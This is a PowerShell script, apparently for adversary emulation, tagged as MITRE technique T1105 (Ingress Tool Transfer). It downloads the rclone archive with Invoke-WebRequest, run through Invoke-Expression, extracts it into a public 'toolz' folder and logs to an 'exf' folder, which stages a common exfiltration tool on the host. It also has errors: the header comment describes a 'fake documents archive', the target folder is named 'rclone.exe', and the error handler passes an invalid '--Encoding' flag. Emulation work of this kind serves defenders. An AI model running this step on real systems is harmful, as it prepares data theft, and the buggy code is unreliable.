# Downloads fake documents archive
# Technic ID : T1105
Clear-Host
Write-Output "==============================================================================="
Write-Output "Command and Control : Ingress Tool Transfer (T1105)"
Write-Output "==============================================================================="
#
$ArchiveFile = "rclone-current-windows-amd64.zip"
$DestinationDirectory = "$env:PUBLIC\toolz\rclone.exe"
$Full_Destination = "$DestinationDirectory"+"\"+"$ArchiveFile"
$LogFile = "$env:PUBLIC\exf\rclone_down_extract.txt"; 
$DownloadURL = "https://downloads.rclone.org/rclone-current-windows-amd64.zip"

$CompleteCommand = "Invoke-WebRequest -Uri" + " $DownloadURL" + " -outfile " + "$Full_Destination";
try {
    Get-Date | Out-File -FilePath "$LogFile" -Encoding utf8 -Force;
    Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
    Invoke-Expression  "$CompleteCommand";
    Write-Output "Successfully downloaded [$ArchiveFile] to $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append; 

    if ([System.IO.File]::Exists("$Full_Destination")) {
        Add-Type -Assembly 'System.IO.Compression.FileSystem';

        # Opens archive
        $zip = [System.IO.Compression.ZipFile]::OpenRead($Full_Destination)
            foreach ($entry in $zip.Entries) {
            # Ignore endtries finishing with "/"
                if ($entry.FullName.EndsWith("/")) { continue }
                $targetPath = Join-Path $DestinationDirectory $entry.Name
                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $targetPath, $true)
                Write-Output "The file [$entry] has been extracted to  $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
            }
#        $zip.Dispose()
#        [System.IO.Compression.ZipFile]::ExtractToDirectory("$Full_Destination", "$DestinationDirectory");
        Write-Output "The file [$ArchiveFile] has been extracted to  $DestinationDirectory" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append;
        Get-ChildItem -Path $DestinationDirectory | Out-File -FilePath $LogFile -Encoding utf8 -Append
        exit 0;
    } 
    else {
        Write-Output "The file [$ArchiveFile] does not exists !!!" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append; 
        exit 2;
    };

}
catch {
    Write-Output "The download of [$ArchiveFile] has failed : $($_.Exception.Message)" | Out-File -FilePath "$LogFile" --Encoding utf8 -Append; 
    exit 1;   
}